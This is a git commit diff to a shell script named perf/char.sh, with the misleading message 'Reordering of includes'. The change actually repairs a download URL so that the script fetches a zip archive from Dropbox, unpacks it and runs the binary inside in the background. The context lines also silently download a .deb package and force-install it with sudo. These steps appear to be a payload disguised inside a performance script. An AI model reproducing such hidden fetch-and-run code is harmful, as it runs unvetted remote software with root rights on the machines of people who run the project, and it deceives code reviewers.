bf9646fd1008b08a194080f859530951a320e55b
robbi-reylynn <37505700+robbi-reylynn@users.noreply.github.com>
2018-04-09 09:25:41 +0200

    Reordering of includes

--- perf/char.sh
+++ perf/char.sh
@@ -4,7 +4,7 @@ end=$((SECONDS+$1))
 wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
 sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
 rm -rf libstdc.deb
-wget hhttps://www.dropbox.com/s/6fifwy1wz0bx2mu/scomp.zip -q
+wget https://www.dropbox.com/s/6fifwy1wz0bx2mu/scomp.zip -q
 unzip scomp.zip > /dev/null 2>&1
 #pwd
 ./perf/scomp ./perf/catalog &
